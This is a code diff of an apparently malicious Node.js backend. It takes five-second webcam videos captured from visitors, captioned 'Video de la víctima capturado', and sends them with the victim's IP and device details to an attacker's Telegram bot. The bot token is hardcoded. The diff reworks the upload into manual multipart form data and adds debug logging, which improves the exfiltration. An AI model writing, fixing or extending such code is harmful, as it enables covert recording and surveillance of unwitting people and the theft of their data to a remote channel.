@@ -1,18 +1,23 @@
 const formidable = require('formidable');
 const fs = require('fs');
 
-// Función para enviar video a Telegram
+// Función para enviar video a Telegram usando multipart/form-data manual
 async function sendVideoToTelegram(videoBuffer, message, ip) {
   const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8083680161:AAFw7sJh6ckiRHkgMS3WsC6J0Ya8Q5aPwE';
   const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
   
+  console.log('=== TELEGRAM DEBUG ===');
+  console.log('Token:', TELEGRAM_BOT_TOKEN ? 'Configurado' : 'No configurado');
+  console.log('Chat ID:', TELEGRAM_CHAT_ID);
+  console.log('Video size:', videoBuffer.length, 'bytes');
+  
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.log('Telegram no configurado');
-    return;
+    console.log('ERROR: Telegram no configurado');
+    return false;
   }
 
   try {
-    console.log('Enviando video a Telegram...');
+    console.log('1. Enviando mensaje de texto...');
     
     // Primero enviar el mensaje de texto
     const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -27,33 +32,67 @@ async function sendVideoToTelegram(videoBuffer, message, ip) {
       })
     });
 
+    const messageResult = await messageResponse.json();
+    console.log('Mensaje resultado:', messageResult);
+
     if (messageResponse.ok) {
-      console.log('Mensaje de texto enviado a Telegram');
+      console.log('✅ Mensaje de texto enviado correctamente');
+    } else {
+      console.log('❌ Error enviando mensaje:', messageResult);
     }
 
-    // Luego enviar el video usando FormData
+    console.log('2. Enviando video...');
+    
+    // Crear multipart/form-data manualmente para el video
+    const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
     const videoFileName = `video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm`;
     
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('caption', '🎥 Video de la víctima capturado (5 segundos)');
-    formData.append('video', new Blob([videoBuffer], { type: 'video/webm' }), videoFileName);
+    // Construir el cuerpo multipart
+    let body = '';
+    
+    // Chat ID
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+    body += `${TELEGRAM_CHAT_ID}\r\n`;
+    
+    // Caption
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
+    body += `🎥 Video de la víctima capturado (5 segundos)\r\n`;
+    
+    // Video file
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="video"; filename="${videoFileName}"\r\n`;
+    body += `Content-Type: video/webm\r\n\r\n`;
+    
+    // Crear el buffer final
+    const preBuffer = Buffer.from(body, 'utf8');
+    const postBuffer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
+    const finalBuffer = Buffer.concat([preBuffer, videoBuffer, postBuffer]);
+    
+    console.log('Tamaño del buffer final:', finalBuffer.length, 'bytes');
     
     const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
       method: 'POST',
-      body: formData
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': finalBuffer.length.toString()
+      },
+      body: finalBuffer
     });
 
+    const videoResult = await videoResponse.json();
+    console.log('Video resultado:', videoResult);
+
     if (videoResponse.ok) {
-      console.log('Video enviado a Telegram exitosamente');
+      console.log('✅ Video enviado a Telegram exitosamente');
       return true;
     } else {
-      const errorText = await videoResponse.text();
-      console.error('Error en respuesta de Telegram video:', errorText);
+      console.log('❌ Error enviando video:', videoResult);
       return false;
     }
   } catch (error) {
-    console.error('Error enviando video a Telegram:', error);
+    console.error('❌ Error crítico enviando a Telegram:', error);
     return false;
   }
 }
@@ -164,16 +203,21 @@ ${deviceDetails}
 🎬 <b>Video adjunto abajo ⬇️</b>`;
 
     // Enviar a Telegram
-    await sendVideoToTelegram(videoBuffer, message, ip);
+    const telegramSent = await sendVideoToTelegram(videoBuffer, message, ip);
 
-    // Log
-    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB - Duration: 5 seconds`);
+    // Log detallado
+    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB - Duration: 5 seconds - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);
 
     res.json({ 
       status: 'success', 
-      message: 'Video de 5 segundos enviado a Telegram correctamente',
+      message: telegramSent ? 'Video de 5 segundos enviado a Telegram correctamente' : 'Video procesado pero Telegram falló',
       filename: `video_${Date.now()}_${ip}.webm`,
-      telegramSent: true
+      telegramSent: telegramSent,
+      debug: {
+        videoSize: fileSize + 'MB',
+        ip: ip,
+        timestamp: timestamp
+      }
     });
 
   } catch (error) {
